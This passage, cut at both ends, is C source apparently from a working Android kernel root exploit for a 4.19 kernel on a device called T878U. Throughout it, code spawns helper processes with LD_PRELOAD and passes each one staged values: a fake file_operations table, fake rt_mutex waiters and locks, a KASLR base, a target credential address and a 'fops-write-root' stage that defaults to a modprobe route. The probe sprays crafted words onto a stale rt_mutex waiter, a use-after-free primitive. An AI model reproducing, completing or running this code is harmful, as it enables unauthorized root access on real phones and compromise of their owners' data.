      {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
      {"IONSTACK_STAGE", "fops-page-hold"},
      {"IONSTACK_PAGE_HOLD_SEC", hold_value},
      {"IONSTACK_FOPS_PI_WAITERS",
       fops_pi_waiters && *fops_pi_waiters ? fops_pi_waiters : "0"},
      {"IONSTACK_FOPS_PI_LEFTMOST",
       fops_pi_leftmost && *fops_pi_leftmost ? fops_pi_leftmost : "1"},
      {"IONSTACK_FOPS_PI_NODE_SAFE",
       fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
      {"IONSTACK_FOPS_PI_RB_SHAPE",
       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
      /*
       * Owner mode was hardcoded to "none" together with
       * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
       * what effective_t878u_lock_owner_mode() clamps away, because an
       * ownerless rt_mutex_adjust_prio_chain walks into
       * rt_mutex_top_waiter(lock)'s BUG_ON(w->lock != lock) on this 4.19
       * tree.  Hardcoding both meant the clamp was computed and then
       * discarded (see the (void)effective_owner_mode above), so the route
       * always ran the configuration the code documents as crashing.
       *
       * Honour the host env so the three configurations can be compared
       * without a rebuild; default to the clamp's answer ("init-task").
       */
      {"IONSTACK_FOPS_LOCK_OWNER_MODE",
       effective_t878u_lock_owner_mode(fops_lock_owner_mode)},
      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI",
       env_truthy_name("IONSTACK_T878U_ALLOW_OWNERLESS_PI") ? "1" : "0"},
      {"IONSTACK_FOPS_LOCK_WAITERS",
       fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
      {"IONSTACK_FOPS_WAIT_LOCK_WORD",
       fops_wait_lock_word && *fops_wait_lock_word ? fops_wait_lock_word
                                                   : "0"},
      {"IONSTACK_FOPS_WAITER_PRIO",
       fops_waiter_prio && *fops_waiter_prio ? fops_waiter_prio : "0"},
      {"IONSTACK_FOPS_WAITER_TASK_MODE",
       fops_waiter_task_mode && *fops_waiter_task_mode
           ? fops_waiter_task_mode
           : "init-task"},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  for (size_t i = 0; i < sizeof(fixed_environment) / sizeof(fixed_environment[0]);
       ++i) {
    environment[env_count++] = fixed_environment[i];
  }
  if (page_observe && *page_observe) {
    environment[env_count++] =
        (struct env_pair){"IONSTACK_PAGE_OBSERVE", page_observe};
  }
  if (page_observe_log && *page_observe_log) {
    environment[env_count++] =
        (struct env_pair){"IONSTACK_PAGE_OBSERVE_LOG", page_observe_log};
  }
  append_reclaim_env_overrides(environment, &env_count,
                               sizeof(environment) / sizeof(environment[0]));
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  return spawn_child(child, argv[0], argv, environment, env_count);
}

static int __attribute__((unused)) spawn_capture(struct child_proc *child, unsigned worker,
                         const struct target_state *target,
                         const struct helper_state *helper,
                         uint64_t linear_map_base) {
  char kaslr_value[32];
  char cred_value[32];
  char fops_value[32];
  char linear_value[32];
  char pid_value[32];
  const char *capture_stage = getenv("IONSTACK_CAPTURE_STAGE");
  const char *root_route = getenv("IONSTACK_FOPS_ROOT_ROUTE");
  const char *root_attempts = getenv("IONSTACK_FOPS_ROOT_ATTEMPTS");
  const char *root_retry_us = getenv("IONSTACK_FOPS_ROOT_RETRY_US");
  const char *root_cleanup_delay_ms =
      getenv("IONSTACK_FOPS_ROOT_CLEANUP_DELAY_MS");
  const char *check_attempts = getenv("IONSTACK_FOPS_CHECK_ATTEMPTS");
  const char *check_retry_us = getenv("IONSTACK_FOPS_CHECK_RETRY_US");
  const char *check_restore = getenv("IONSTACK_FOPS_CHECK_RESTORE");
  const char *stage_value = capture_stage && *capture_stage
                                ? capture_stage
                                : "fops-write-root";
  snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
           target->kaslr_base);
  snprintf(cred_value, sizeof(cred_value), "0x%016" PRIx64, target->cred);
  snprintf(fops_value, sizeof(fops_value), "0x%016" PRIx64,
           helper->fake_fops);
  snprintf(linear_value, sizeof(linear_value), "0x%016" PRIx64,
           linear_map_base);
  snprintf(pid_value, sizeof(pid_value), "%d", (int)target->remote_pid);
  char lock_value[32];
  char w0_value[32];
  char task_value[32];
  char binwrite_value[32];
  const char *fops_pi_waiters = getenv("IONSTACK_FOPS_PI_WAITERS");
  const char *fops_pi_leftmost = getenv("IONSTACK_FOPS_PI_LEFTMOST");
  const char *fops_pi_node_safe = getenv("IONSTACK_FOPS_PI_NODE_SAFE");
  const char *fops_pi_rb_shape = getenv("IONSTACK_FOPS_PI_RB_SHAPE");
  const char *fops_lock_owner_mode = getenv("IONSTACK_FOPS_LOCK_OWNER_MODE");
  const char *fops_lock_waiters = getenv("IONSTACK_FOPS_LOCK_WAITERS");
  const char *fops_wait_lock_word = getenv("IONSTACK_FOPS_WAIT_LOCK_WORD");
  const char *fops_waiter_prio = getenv("IONSTACK_FOPS_WAITER_PRIO");
  const char *fops_waiter_task_mode =
      getenv("IONSTACK_FOPS_WAITER_TASK_MODE");
  const char *effective_owner_mode =
      effective_t878u_lock_owner_mode(fops_lock_owner_mode);
  (void)effective_owner_mode;
  struct env_pair environment[26];
  size_t env_count = 0;
  snprintf(lock_value, sizeof(lock_value), "0x%016" PRIx64, helper->fake_lock);
  snprintf(w0_value, sizeof(w0_value), "0x%016" PRIx64, helper->fake_w0);
  snprintf(task_value, sizeof(task_value), "0x%016" PRIx64, helper->fake_task);
  snprintf(binwrite_value, sizeof(binwrite_value), "0x%016" PRIx64,
           helper->binwrite);
  environment[env_count++] =
      (struct env_pair){"IONSTACK_STAGE", stage_value};
  environment[env_count++] =
      (struct env_pair){"IONSTACK_EXPECT_FAKE_FOPS", fops_value};
  if (strcmp(stage_value, "fops-write-root") == 0) {
    /*
     * Prefer the write-only modprobe path on T878U.  It only needs the
     * ashmem configfs write primitive and avoids the ashmem/configfs read
     * path that can hard-fault this 4.19 build.
     */
    environment[env_count++] = (struct env_pair){
        "IONSTACK_FOPS_ROOT_ROUTE",
        root_route && *root_route ? root_route : "modprobe"};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_TARGET_PID", pid_value};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_TARGET_CRED", cred_value};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_FOPS_ROOT_ATTEMPTS",
        root_attempts && *root_attempts ? root_attempts : "10000000"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_FOPS_ROOT_RETRY_US",
        root_retry_us && *root_retry_us ? root_retry_us : "0"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_FOPS_ROOT_CLEANUP_DELAY_MS",
        root_cleanup_delay_ms && *root_cleanup_delay_ms
            ? root_cleanup_delay_ms
            : "6500"};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_LINEAR_MAP_BASE", linear_value};
  } else if (strcmp(stage_value, "fops-check") == 0) {
    if (fops_pi_rb_shape && *fops_pi_rb_shape) {
      environment[env_count++] =
          (struct env_pair){"IONSTACK_FOPS_PI_RB_SHAPE", fops_pi_rb_shape};
    }
    if (check_attempts && *check_attempts) {
      environment[env_count++] =
          (struct env_pair){"IONSTACK_FOPS_CHECK_ATTEMPTS", check_attempts};
    }
    if (check_retry_us && *check_retry_us) {
      environment[env_count++] =
          (struct env_pair){"IONSTACK_FOPS_CHECK_RETRY_US", check_retry_us};
    }
    if (check_restore && *check_restore) {
      environment[env_count++] =
          (struct env_pair){"IONSTACK_FOPS_CHECK_RESTORE", check_restore};
    }
  } else if (strcmp(stage_value, "fops-page-validate") == 0) {
    environment[env_count++] =
        (struct env_pair){"IONSTACK_EXPECT_FAKE_LOCK", lock_value};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_EXPECT_FAKE_W0", w0_value};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_EXPECT_FAKE_TASK", task_value};
    environment[env_count++] =
        (struct env_pair){"IONSTACK_EXPECT_BINWRITE", binwrite_value};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_PI_WAITERS",
        fops_pi_waiters && *fops_pi_waiters ? fops_pi_waiters : "0"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_PI_LEFTMOST",
        fops_pi_leftmost && *fops_pi_leftmost ? fops_pi_leftmost : "1"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_PI_NODE_SAFE",
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_PI_RB_SHAPE",
        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_LOCK_OWNER_MODE", effective_owner_mode};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_LOCK_WAITERS",
        fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_WAIT_LOCK_WORD",
        fops_wait_lock_word && *fops_wait_lock_word ? fops_wait_lock_word
                                                    : "0"};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_WAITER_PRIO",
        fops_waiter_prio && *fops_waiter_prio ? fops_waiter_prio
                                              : LEGACY_CHAINWALK_WAITER_PRIO};
    environment[env_count++] = (struct env_pair){
        "IONSTACK_EXPECT_FOPS_WAITER_TASK_MODE",
        fops_waiter_task_mode && *fops_waiter_task_mode
            ? fops_waiter_task_mode
            : "init-task"};
  }
  environment[env_count++] =
      (struct env_pair){"IONSTACK_KASLR_BASE", kaslr_value};
  environment[env_count++] =
      (struct env_pair){"LD_PRELOAD", REMOTE_PRELOAD};
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  int rc = spawn_child(child, argv[0], argv, environment, env_count);
  if (rc == 0) {
    static const int cpus[CAPTURE_WORKERS] = {0, 2, 3, 4, 5, 6};
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpus[worker % CAPTURE_WORKERS], &set);
    if (sched_setaffinity(child->pid, sizeof(set), &set) != 0) {
      fprintf(stderr,
              "[reroot] capture affinity warning worker=%u pid=%d errno=%d\n",
              worker, child->pid, errno);
    }
  }
  return rc;
}

static int __attribute__((unused)) spawn_probe(
    struct child_proc *child, const struct helper_state *helper,
    const struct target_state *target, int default_chainwalk) {
  char *argv[64];
  size_t argc = 0;
  char kaslr_value[32];
  char task_arg[64];
  char lock_arg[64];
  char opcode_arg[64];
  char word3_arg[64];
  char word4_arg[64];
  char word5_arg[64];
  char word6_arg[64];
  char word7_arg[64];
  char waiter_timeout_arg[64];
  char hold_arg[64];
  char idle_arg[64];
  char watchdog_arg[64];
  char adjust_pi_repeats_arg[64];
  const char *probe_stage = getenv("IONSTACK_PROBE_STAGE");
  const char *post_return = getenv("IONSTACK_PROBE_POST_RETURN");
  const char *adjust_pi_syscall = getenv("IONSTACK_PROBE_ADJUST_PI_SYSCALL");
  const char *adjust_pi_policy = getenv("IONSTACK_PROBE_ADJUST_PI_POLICY");
  const char *adjust_pi_repeats = getenv("IONSTACK_PROBE_ADJUST_PI_REPEATS");
  const char *adjust_pi_after_churn =
      getenv("IONSTACK_PROBE_ADJUST_PI_AFTER_CHURN");
  const char *skip_adjust_pi = getenv("IONSTACK_PROBE_SKIP_ADJUST_PI");
  int skip_adjust_pi_enabled =
      skip_adjust_pi && *skip_adjust_pi && strcmp(skip_adjust_pi, "0") != 0;
  int adjust_pi_after_churn_enabled =
      adjust_pi_after_churn && *adjust_pi_after_churn &&
      strcmp(adjust_pi_after_churn, "0") != 0;
  const char *isolated_hold = getenv("IONSTACK_PROBE_ISOLATED_HOLD");
  const char *skip_task = getenv("IONSTACK_PROBE_SKIP_IO_SUBMIT_TASK");
  const char *skip_lock = getenv("IONSTACK_PROBE_SKIP_IO_SUBMIT_LOCK");
  const char *task_override = getenv("IONSTACK_PROBE_IO_SUBMIT_TASK");
  const char *lock_override = getenv("IONSTACK_PROBE_IO_SUBMIT_LOCK");
  const char *stage_flag = "--stage-edeadlk-idle";
  const char *post_return_value =
      post_return && *post_return ? post_return : "pipe-read-io-submit";
  int post_return_supports_adjust_pi_start_hold =
      strcmp(post_return_value, "readv-block-small") == 0 ||
      strcmp(post_return_value, "readv-block-large") == 0 ||
      strcmp(post_return_value, "epoll-block") == 0 ||
      strcmp(post_return_value, "sendmsg-block") == 0 ||
      strcmp(post_return_value, "sendmmsg-block") == 0 ||
      strcmp(post_return_value, "sendmsg-dgram-name-block") == 0 ||
      strcmp(post_return_value, "sendmmsg-name-block") == 0 ||
      strcmp(post_return_value, "sigsuspend-block") == 0;
  const char *adjust_pi_syscall_value =
      adjust_pi_syscall && *adjust_pi_syscall ? adjust_pi_syscall
                                              : "sched-setparam";
  const char *adjust_pi_policy_value =
      adjust_pi_policy && *adjust_pi_policy ? adjust_pi_policy : "batch";
  const char *isolated_hold_value =
      isolated_hold && *isolated_hold ? isolated_hold : "getuidloop";
  const char *waiter_timeout_value =
      getenv("IONSTACK_PROBE_WAITER_TIMEOUT_MS");
  const char *hold_value = getenv("IONSTACK_PROBE_HOLD_MS");
  const char *idle_value = getenv("IONSTACK_PROBE_IDLE_MS");
  const char *watchdog_value = getenv("IONSTACK_PROBE_WATCHDOG_SEC");
  const char *pre_chainwalk_us_value =
      getenv("IONSTACK_PROBE_PRE_CHAINWALK_US");
  const char *waiter_churn_value = getenv("IONSTACK_PROBE_WAITER_CHURN");
  const char *stackshape_case_value =
      getenv("IONSTACK_PROBE_STACKSHAPE_CASE");
  const char *frameprobe_case_value =
      getenv("IONSTACK_PROBE_FRAMEPROBE_CASE");
  const char *churn_iterations_value =
      getenv("IONSTACK_PROBE_CHURN_ITERATIONS");
  const char *churn_keep_fds_value =
      getenv("IONSTACK_PROBE_CHURN_KEEP_FDS");
  const char *process_vm_mb_value = getenv("IONSTACK_PROBE_PROCESS_VM_MB");
  const char *churn_progress_value = getenv("IONSTACK_PROBE_CHURN_PROGRESS");
  const char *chainwalk_at_churn_iter_value =
      getenv("IONSTACK_PROBE_CHAINWALK_AT_CHURN_ITER");
  const char *chainwalk_after_churn =
      getenv("IONSTACK_PROBE_CHAINWALK_AFTER_CHURN");
  int chainwalk_after_churn_enabled =
      chainwalk_after_churn && *chainwalk_after_churn &&
      strcmp(chainwalk_after_churn, "0") != 0;
  const char *quiet_waiter_churn = getenv("IONSTACK_PROBE_QUIET_WAITER_CHURN");
  int quiet_waiter_churn_enabled =
      quiet_waiter_churn && *quiet_waiter_churn &&
      strcmp(quiet_waiter_churn, "0") != 0;
  const char *chainwalk_raw_final = getenv("IONSTACK_PROBE_CHAINWALK_RAW_FINAL");
  int chainwalk_raw_final_enabled =
      chainwalk_raw_final && *chainwalk_raw_final &&
      strcmp(chainwalk_raw_final, "0") != 0;
  const char *chainwalk_raw_timeout_ms_value =
      getenv("IONSTACK_PROBE_CHAINWALK_RAW_TIMEOUT_MS");
  const char *chainwalk_raw_val3_value =
      getenv("IONSTACK_PROBE_CHAINWALK_RAW_VAL3");
  const char *stack_marker_telemetry_value =
      getenv("IONSTACK_PROBE_STACK_MARKER_TELEMETRY");
  const char *adjust_pi_start_hold_value =
      getenv("IONSTACK_PROBE_ADJUST_PI_START_HOLD");
  const char *frameprobe_select_shift_value =
      getenv("IONSTACK_PROBE_FRAMEPROBE_SELECT_SHIFT");
  const char *frameprobe_select_shape_value =
      getenv("IONSTACK_PROBE_FRAMEPROBE_SELECT_SHAPE");
  const char *frameprobe_select_head_value =
      getenv("IONSTACK_PROBE_FRAMEPROBE_SELECT_HEAD");
  const char *frameprobe_futex_uaddr_shift_value =
      getenv("IONSTACK_PROBE_FUTEX_UADDR_SHIFT");
  const char *frameprobe_futex_timeout_shift_value =
      getenv("IONSTACK_PROBE_FUTEX_TIMEOUT_SHIFT");
  const char *frameprobe_futex_uaddr2_shift_value =
      getenv("IONSTACK_PROBE_FUTEX_UADDR2_SHIFT");
  const char *frameprobe_futex_val3_value =
      getenv("IONSTACK_PROBE_FUTEX_VAL3");
  const char *frameprobe_futex_uaddr_word_value =
      getenv("IONSTACK_PROBE_FUTEX_UADDR_WORD");
  const char *frameprobe_futex_uaddr2_word_value =
      getenv("IONSTACK_PROBE_FUTEX_UADDR2_WORD");
  const char *frameprobe_ppoll_shift_value =
      getenv("IONSTACK_PROBE_PPOLL_SHIFT");
  const char *frameprobe_ppoll_nfds_value =
      getenv("IONSTACK_PROBE_PPOLL_NFDS");
  const char *frameprobe_ppoll_shape_value =
      getenv("IONSTACK_PROBE_PPOLL_SHAPE");
  const char *sendmsg_name_shift_value =
      getenv("IONSTACK_PROBE_SENDMSG_NAME_SHIFT");
  const char *sendmsg_name_shape_value =
      getenv("IONSTACK_PROBE_SENDMSG_NAME_SHAPE");
  const char *fake_waiter_head_mode_value =
      getenv("IONSTACK_PROBE_FAKE_WAITER_HEAD_MODE");
  const char *post_exit_delay_ms_value =
      getenv("IONSTACK_PROBE_POST_EXIT_DELAY_MS");
  const char *main_final_shape_value =
      getenv("IONSTACK_PROBE_MAIN_FINAL_SHAPE");
  const char *regspray_value = getenv("IONSTACK_PROBE_REGSPRAY_VALUE");
  const char *stacktag_value = getenv("IONSTACK_PROBE_STACKTAG_VALUE");
  const char *opcode_value = getenv("IONSTACK_PROBE_IO_SUBMIT_OPCODE");
  const char *fops_waiter_prio_value = getenv("IONSTACK_FOPS_WAITER_PRIO");
  const char *fops_pi_rb_shape_value = getenv("IONSTACK_FOPS_PI_RB_SHAPE");
  const char *fops_pi_node_safe_value = getenv("IONSTACK_FOPS_PI_NODE_SAFE");
  const char *word3_value = getenv("IONSTACK_PROBE_IO_SUBMIT_WORD3");
  const char *word4_value = getenv("IONSTACK_PROBE_IO_SUBMIT_WORD4");
  const char *word5_value = getenv("IONSTACK_PROBE_IO_SUBMIT_WORD5");
  const char *word6_value = getenv("IONSTACK_PROBE_IO_SUBMIT_WORD6");
  const char *word7_value = getenv("IONSTACK_PROBE_IO_SUBMIT_WORD7");
  char post_return_arg[128];
  char adjust_pi_syscall_arg[128];
  char adjust_pi_policy_arg[128];
  char isolated_hold_arg[128];
  char pre_chainwalk_arg[128];
  char waiter_churn_arg[128];
  char stackshape_case_arg[128];
  char frameprobe_case_arg[128];
  char churn_iterations_arg[128];
  char churn_keep_fds_arg[128];
  char process_vm_mb_arg[128];
  char churn_progress_arg[128];
  char chainwalk_at_churn_iter_arg[128];
  char chainwalk_raw_timeout_ms_arg[128];
  char chainwalk_raw_val3_arg[128];
  char stack_marker_telemetry_arg[128];
  char frameprobe_select_shift_arg[128];
  char frameprobe_select_shape_arg[128];
  char frameprobe_select_head_arg[128];
  char frameprobe_futex_uaddr_shift_arg[128];
  char frameprobe_futex_timeout_shift_arg[128];
  char frameprobe_futex_uaddr2_shift_arg[128];
  char frameprobe_futex_val3_arg[128];
  char frameprobe_futex_uaddr_word_arg[128];
  char frameprobe_futex_uaddr2_word_arg[128];
  char frameprobe_ppoll_shift_arg[128];
  char frameprobe_ppoll_nfds_arg[128];
  char frameprobe_ppoll_shape_arg[128];
  char sendmsg_name_shift_arg[128];
  char sendmsg_name_shape_arg[128];
  char fake_waiter_head_mode_arg[128];
  char post_exit_delay_ms_arg[128];
  char main_final_shape_arg[128];
  char regspray_arg[128];
  char stacktag_arg[128];
  int want_fake_waiter_head = 0;
  int sendmsg_name_fake_waiter_shape =
      sendmsg_name_shape_value && *sendmsg_name_shape_value &&
      (strcmp(sendmsg_name_shape_value, "fake-waiter") == 0 ||
       strcmp(sendmsg_name_shape_value, "fake-waiter-tree") == 0);
  int frameprobe_fake_waiter_shape =
      frameprobe_select_shape_value && *frameprobe_select_shape_value &&
      strcmp(frameprobe_select_shape_value, "fake-waiter") == 0;
  int want_fake_waiter_overlay =
      sendmsg_name_fake_waiter_shape || frameprobe_fake_waiter_shape;
  int fops_pi_node_safe =
      fops_pi_node_safe_value && *fops_pi_node_safe_value &&
      strcmp(fops_pi_node_safe_value, "0") != 0;
  int fops_pi_rb_safe =
      fops_pi_rb_shape_value && strcmp(fops_pi_rb_shape_value, "safe") == 0;
  int fops_pi_rb_legacy_oppo =
      fops_pi_rb_shape_value &&
      strcmp(fops_pi_rb_shape_value, "legacy-oppo") == 0;
  int fops_pi_rb_ghostlock_right =
      fops_pi_rb_shape_value &&
      strcmp(fops_pi_rb_shape_value, "ghostlock-right") == 0;
  int fops_pi_rb_binwrite_right =
      fops_pi_rb_shape_value &&
      strcmp(fops_pi_rb_shape_value, "binwrite-right") == 0;
  int fops_pi_rb_target_right =
      fops_pi_rb_shape_value &&
      strcmp(fops_pi_rb_shape_value, "target-right") == 0;
  const char *requested_stage =
      probe_stage && *probe_stage ? probe_stage
                                  : (default_chainwalk ? "chainwalk" : "");
  const char *probe_stage_value =
      effective_t878u_probe_stage(requested_stage, post_return_value,
                                  sendmsg_name_shape_value,
                                  isolated_hold_value);
  uint64_t auto_word3 = 0;
  uint64_t auto_word4 = 0;
  uint64_t auto_word5 = 0;

  snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
           target ? target->kaslr_base : 0);

  if (probe_stage_value && strcmp(probe_stage_value, "chainwalk") == 0) {
    stage_flag = "--stage-chainwalk";
  } else if (probe_stage_value &&
             strcmp(probe_stage_value, "waiter-exit-chainwalk") == 0) {
    stage_flag = "--stage-waiter-exit-chainwalk";
  }
  if (task_override && *task_override) {
    uint64_t resolved_task = 0;
    if (strcmp(task_override, "fake-task") == 0) {
      resolved_task = helper->fake_task;
    } else if ((strcmp(task_override, "target-task") == 0 ||
                strcmp(task_override, "leak-task") == 0) &&
               target && target->task) {
      resolved_task = target->task;
    } else if (strcmp(task_override, "init-task") == 0 &&
               target && target->kaslr_base) {
      resolved_task = target->kaslr_base + EXPECTED_INIT_TASK_OFF;
    }
    if (resolved_task) {
      snprintf(task_arg, sizeof(task_arg), "--io-submit-task=0x%016" PRIx64,
               resolved_task);
    } else {
      snprintf(task_arg, sizeof(task_arg), "--io-submit-task=%s",
               task_override);
    }
  } else {
    snprintf(task_arg, sizeof(task_arg), "--io-submit-task=0x%016" PRIx64,
             helper->fake_task);
  }
  if (lock_override && *lock_override) {
    uint64_t resolved_lock = 0;
    if (strcmp(lock_override, "ghostlock-overlay") == 0 ||
        strcmp(lock_override, "fops-overlay") == 0 ||
        strcmp(lock_override, "tree-parent") == 0) {
      uint64_t misc_fops_alias = p0_data_alias_const_u64(ASHMEM_MISC_FOPS);
      if (misc_fops_alias >= 0x08ULL) {
        resolved_lock = misc_fops_alias - 0x08ULL;
      }
    } else if (strcmp(lock_override, "binwrite-overlay") == 0 ||
               strcmp(lock_override, "page-scratch-overlay") == 0) {
      if (helper->binwrite >= 0x08ULL) {
        resolved_lock = helper->binwrite - 0x08ULL;
      }
    }
    if (resolved_lock) {
      snprintf(lock_arg, sizeof(lock_arg), "--io-submit-lock=0x%016" PRIx64,
               resolved_lock);
    } else {
      snprintf(lock_arg, sizeof(lock_arg), "--io-submit-lock=%s",
               lock_override);
    }
  } else {
    snprintf(lock_arg, sizeof(lock_arg), "--io-submit-lock=0x%016" PRIx64,
             helper->fake_lock);
  }
  /*
   * The legacy probe encodes waiter->prio in the low 32 bits of the iocb
   * words it sprays back onto W's stale rt_mutex_waiter.  Keep that value
   * aligned with the held-page fake waiter unless the caller explicitly
   * overrides it, otherwise the probe and the capture worker exercise mixed
   * waiter layouts.
   */
  snprintf(opcode_arg, sizeof(opcode_arg), "--io-submit-opcode=%s",
           opcode_value && *opcode_value
               ? opcode_value
               : (fops_waiter_prio_value && *fops_waiter_prio_value
                      ? fops_waiter_prio_value
                      : LEGACY_CHAINWALK_WAITER_PRIO));
  if (fops_pi_rb_safe) {
    fops_pi_node_safe = 1;
  }
  if (want_fake_waiter_overlay) {
    uint64_t misc_fops_alias = p0_data_alias_const_u64(ASHMEM_MISC_FOPS);
    if (fops_pi_node_safe) {
      auto_word3 = 0;
      auto_word4 = 0;
      auto_word5 = 0;
    } else if (fops_pi_rb_ghostlock_right) {
      auto_word3 = misc_fops_alias - 0x08ULL;
      auto_word4 = helper->fake_fops;
      auto_word5 = 0;
    } else if (fops_pi_rb_target_right) {
      auto_word3 = misc_fops_alias - 0x08ULL;
      auto_word4 = helper->fake_fops;
      auto_word5 = 0;
    } else if (fops_pi_rb_binwrite_right) {
      auto_word3 = (helper->binwrite - 0x08ULL) | 1ULL;
      auto_word4 = helper->binwrite + (RIGHT_OFF - SCRATCH_OFF);
      auto_word5 = 0;
    } else if (fops_pi_rb_legacy_oppo) {
      auto_word3 = helper->fake_fops;
      auto_word4 = 0;
      auto_word5 = misc_fops_alias;
    } else {
      auto_word3 = helper->fake_fops;
      auto_word4 = misc_fops_alias;
      auto_word5 = 0;
    }
  }
  if (word3_value && *word3_value) {
    snprintf(word3_arg, sizeof(word3_arg), "--io-submit-word3=%s",
             word3_value);
  } else {
    snprintf(word3_arg, sizeof(word3_arg), "--io-submit-word3=0x%016" PRIx64,
             auto_word3);
  }
  if (word4_value && *word4_value) {
    snprintf(word4_arg, sizeof(word4_arg), "--io-submit-word4=%s",
             word4_value);
  } else {
    snprintf(word4_arg, sizeof(word4_arg), "--io-submit-word4=0x%016" PRIx64,
             auto_word4);
  }
  if (word5_value && *word5_value) {
    snprintf(word5_arg, sizeof(word5_arg), "--io-submit-word5=%s",
             word5_value);
  } else {
    snprintf(word5_arg, sizeof(word5_arg), "--io-submit-word5=0x%016" PRIx64,
             auto_word5);
  }
  snprintf(word6_arg, sizeof(word6_arg), "--io-submit-word6=%s",
           word6_value && *word6_value ? word6_value : "0");
  snprintf(word7_arg, sizeof(word7_arg), "--io-submit-word7=%s",
           word7_value && *word7_value ? word7_value : "0");
  snprintf(waiter_timeout_arg, sizeof(waiter_timeout_arg),
           "--waiter-timeout-ms=%s",
           waiter_timeout_value && *waiter_timeout_value
               ? waiter_timeout_value
               : "800");
  snprintf(hold_arg, sizeof(hold_arg), "--hold-ms=%s",
           hold_value && *hold_value ? hold_value : "5000");
  snprintf(idle_arg, sizeof(idle_arg), "--idle-ms=%s",
           idle_value && *idle_value ? idle_value : "100");
  snprintf(watchdog_arg, sizeof(watchdog_arg), "--watchdog-sec=%s",
           watchdog_value && *watchdog_value ? watchdog_value : "20");
  snprintf(pre_chainwalk_arg, sizeof(pre_chainwalk_arg),
           "--pre-chainwalk-delay-us=%s",
           pre_chainwalk_us_value && *pre_chainwalk_us_value
               ? pre_chainwalk_us_value
               : "0");
  snprintf(waiter_churn_arg, sizeof(waiter_churn_arg), "--waiter-churn=%s",
           waiter_churn_value && *waiter_churn_value ? waiter_churn_value
                                                     : "none");
  snprintf(stackshape_case_arg, sizeof(stackshape_case_arg),
           "--stackshape-case=%s",
           stackshape_case_value && *stackshape_case_value
               ? stackshape_case_value
               : "full");
  snprintf(frameprobe_case_arg, sizeof(frameprobe_case_arg),
           "--frameprobe-case=%s",
           frameprobe_case_value && *frameprobe_case_value
               ? frameprobe_case_value
               : "readlink");
  snprintf(churn_iterations_arg, sizeof(churn_iterations_arg),
           "--churn-iterations=%s",
           churn_iterations_value && *churn_iterations_value
               ? churn_iterations_value
               : "1");
  snprintf(churn_keep_fds_arg, sizeof(churn_keep_fds_arg),
           "--churn-keep-fds=%s",
           churn_keep_fds_value && *churn_keep_fds_value
               ? churn_keep_fds_value
               : "0");
  snprintf(process_vm_mb_arg, sizeof(process_vm_mb_arg),
           "--process-vm-mb=%s",
           process_vm_mb_value && *process_vm_mb_value ? process_vm_mb_value
                                                       : "0");
  snprintf(churn_progress_arg, sizeof(churn_progress_arg),
           "--churn-progress=%s",
           churn_progress_value && *churn_progress_value ? churn_progress_value
                                                         : "final");
  snprintf(chainwalk_at_churn_iter_arg, sizeof(chainwalk_at_churn_iter_arg),
           "--chainwalk-at-churn-iter=%s",
           chainwalk_at_churn_iter_value && *chainwalk_at_churn_iter_value
               ? chainwalk_at_churn_iter_value
               : "0");
  snprintf(chainwalk_raw_timeout_ms_arg, sizeof(chainwalk_raw_timeout_ms_arg),
           "--chainwalk-raw-timeout-ms=%s",
           chainwalk_raw_timeout_ms_value &&
                   *chainwalk_raw_timeout_ms_value
               ? chainwalk_raw_timeout_ms_value
               : "0");
  snprintf(chainwalk_raw_val3_arg, sizeof(chainwalk_raw_val3_arg),
           "--chainwalk-raw-val3=%s",
           chainwalk_raw_val3_value && *chainwalk_raw_val3_value
               ? chainwalk_raw_val3_value
               : "0");
  snprintf(stack_marker_telemetry_arg, sizeof(stack_marker_telemetry_arg),
           "--stack-marker-telemetry=%s",
           stack_marker_telemetry_value && *stack_marker_telemetry_value
               ? stack_marker_telemetry_value
               : "0");
  snprintf(frameprobe_select_shift_arg, sizeof(frameprobe_select_shift_arg),
           "--frameprobe-select-shift=%s",
           frameprobe_select_shift_value && *frameprobe_select_shift_value
               ? frameprobe_select_shift_value
               : "0");
  snprintf(frameprobe_select_shape_arg, sizeof(frameprobe_select_shape_arg),
           "--frameprobe-select-shape=%s",
           frameprobe_select_shape_value && *frameprobe_select_shape_value
               ? frameprobe_select_shape_value
               : "tag");
  snprintf(frameprobe_select_head_arg, sizeof(frameprobe_select_head_arg),
           "--frameprobe-select-head=%s",
           frameprobe_select_head_value && *frameprobe_select_head_value
               ? frameprobe_select_head_value
               : "0");
  snprintf(frameprobe_futex_uaddr_shift_arg,
           sizeof(frameprobe_futex_uaddr_shift_arg),
           "--frameprobe-futex-uaddr-shift=%s",
           frameprobe_futex_uaddr_shift_value &&
                   *frameprobe_futex_uaddr_shift_value
